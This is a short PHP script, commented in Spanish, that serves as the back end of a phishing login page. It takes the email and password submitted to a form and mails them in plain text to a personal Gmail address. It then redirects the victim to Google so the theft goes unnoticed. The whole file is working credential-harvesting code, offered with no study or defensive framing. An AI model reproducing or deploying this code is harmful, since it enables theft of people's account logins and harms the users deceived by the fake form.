<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir datos
    $email = $_POST["email"] ?? '';
    $password = $_POST["password"] ?? '';

    // Tu correo de destino
    $destinatario = "sebastiancq2008@gmail.com";
    $asunto = "Nuevo inicio de sesión";
    $mensaje = "Correo electrónico: " . $email . "\nContraseña: " . $password;

    // Encabezados obligatorios para que no lo rechacen
    $encabezados = "From: no-responder@tudominio.com\r\n";
    $encabezados .= "Reply-To: no-responder@tudominio.com\r\n";
    $encabezados .= "X-Mailer: PHP/" . phpversion();

    // Enviar correo
    if (mail($destinatario, $asunto, $mensaje, $encabezados)) {
        // Redirigir si se envió
        header("Location: https://www.google.com");
        exit;
    } else {
        echo "Hubo un error al intentar enviar el correo.";
    }
}
?>
